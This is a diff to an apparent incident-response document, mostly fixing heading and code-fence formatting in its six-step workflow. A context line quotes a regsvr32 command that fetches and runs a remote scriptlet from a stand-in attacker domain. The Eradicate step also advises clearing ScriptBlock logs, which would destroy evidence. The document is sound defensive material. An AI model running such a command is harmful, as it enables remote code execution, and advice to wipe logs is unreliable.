@@ -347,10 +347,10 @@ regsvr32 /s /n /u /i:https://cdn.attacker.com/stage.sct scrobj.dll
                    |
                    v
       SYSTEM COMPROMISE → CREDENTIAL THEFT
+```
 
 ```
-```
-##11. Incident Response Workflow (Aligned to IR & Threat Modelling SOP)
+## 11. Incident Response Workflow (Aligned to IR & Threat Modelling SOP)
 
 #Step 1 — Identify
 
@@ -366,7 +366,7 @@ Suspicious TLS outbound traffic
 Immediately tag endpoints as P1 priority
 
 
-#Step 2 — Contain
+# Step 2 — Contain
 
 Isolate endpoint using MDE automated response
 
@@ -375,7 +375,7 @@ Block observed C2 domain/IP at firewall/WAF
 Disable exposed user accounts (O365 + local AD)
 
 
-#Step 3 — Investigate
+# Step 3 — Investigate
 
 Extract full process lineage from:
 
@@ -391,7 +391,7 @@ Check mailbox for matching malicious HTML/PNG delivery
 Review browsing and download history
 
 
-#Step 4 — Eradicate
+# Step 4 — Eradicate
 
 Remove persistence:
 
@@ -405,7 +405,7 @@ Registry Run keys
 Clear ScriptBlock logs revealing decoded payload
 
 
-#Step 5 — Recover
+# Step 5 — Recover
 
 Rebuild compromised hosts if memory-only RAT activity detected
 
@@ -414,7 +414,7 @@ Re-enable accounts post-password reset
 Validate no lateral movement occurred (PsExec, WMI, RPC)
 
 
-#Step 6 — Lessons Learned
+# Step 6 — Lessons Learned
 
 Add sender domain to banned list
 
